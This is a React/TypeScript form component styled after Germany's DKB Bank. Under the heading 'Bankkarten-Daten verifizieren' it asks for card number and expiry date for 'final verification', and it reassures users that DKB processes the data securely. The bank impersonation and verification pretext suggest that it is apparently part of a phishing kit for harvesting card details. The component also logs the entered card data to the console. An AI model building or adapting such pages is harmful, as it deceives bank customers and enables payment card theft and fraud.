import React, { useState } from 'react';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv?: string;
  cardholder_name?: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [errors, setErrors] = useState<Partial<BankCardData>>({});

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      console.log('BankCardForm: Submitting data:', {
        card_number: cardNumber,
        expiry_date: expiryDate,
      });
      await onSubmit({
        card_number: cardNumber,
        expiry_date: expiryDate,
      });
    } catch (error: any) {
      console.error('Error submitting bank card data:', error);
      
      // Handle backend validation errors
      if (error.details && Array.isArray(error.details)) {
        const backendErrors: Partial<BankCardData> = {};
        
        error.details.forEach((detail: any) => {
          if (detail.field === 'expiry_date') {
            backendErrors.expiry_date = 'Ungültiges Ablaufdatum. Format: MM/JJ (Monat 01-12)';
          } else if (detail.field === 'card_number') {
            backendErrors.card_number = 'Ungültige Kartennummer';
          }
        });
        
        setErrors(backendErrors);
      }
      setIsSubmitting(false);
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (!/^\d+(\s\d+)*$/.test(cardNumber.trim())) {
      newErrors.card_number = 'Kartennummer darf nur Zahlen enthalten';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ (Monat 01-12)';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  return (
    <div className="dkb-form-container">
      <div className="dkb-form-card">
        {/* Header with close button */}
        <div className="dkb-form-header">
          <button className="dkb-close-button" type="button">←</button>
          <h1 className="dkb-form-title">Bankkarten-Daten verifizieren</h1>
          <button className="dkb-close-button" type="button">×</button>
        </div>
        
        <p className="dkb-form-description">
          Bitte geben Sie Ihre Bankkarten-Daten zur finalen Verifizierung ein.
        </p>
        
        <form onSubmit={handleSubmit} className="dkb-form">
          {/* Card Number */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={cardNumber}
              onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              placeholder=" "
              className="dkb-input"
              maxLength={19}
              required
            />
            <label className="dkb-input-label">Kartennummer</label>
            {errors.card_number && (
              <div className="dkb-input-error">{errors.card_number}</div>
            )}
          </div>

          {/* Expiry Date */}
          <div className="dkb-input-container">
            <input
              type="text"
              value={expiryDate}
              onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
              placeholder=" "
              className="dkb-input"
              maxLength={5}
              required
            />
            <label className="dkb-input-label">Ablaufdatum</label>
            {errors.expiry_date && (
              <div className="dkb-input-error">{errors.expiry_date}</div>
            )}
          </div>

          {/* Security Notice */}
          <div className="dkb-security-notice">
            <p style={{
              margin: '0',
              fontSize: '14px',
              lineHeight: '20px',
              color: 'var(--dkb-text-subdued)',
              fontFamily: 'DKBEuclid, Arial, sans-serif'
            }}>
              <span style={{ fontWeight: '600' }}>Sicherheitshinweis:</span> Alle Daten werden verschlüsselt übertragen und gemäß den höchsten Sicherheitsstandards der DKB Bank verarbeitet.
            </p>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="dkb-submit-button"
            style={{ 
              opacity: isSubmitting ? 0.7 : 1,
              cursor: isSubmitting ? 'not-allowed' : 'pointer'
            }}
          >
            {isSubmitting ? (
              <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                <div style={{
                  width: '16px',
                  height: '16px',
                  border: '2px solid rgba(255, 255, 255, 0.3)',
                  borderTop: '2px solid #ffffff',
                  borderRadius: '50%',
                  animation: 'dkb-spin 1s linear infinite'
                }} />
                Daten werden übertragen...
              </span>
            ) : (
              'Weiter'
            )}
          </button>

          {/* Skip Button */}
          {onSkip && (
            <button
              type="button"
              onClick={onSkip}
              disabled={isSubmitting}
              className="dkb-skip-button"
            >
              Ich habe keine Kreditkarte
            </button>
          )}
        </form>
      </div>
    </div>
  );
};

export default BankCardForm;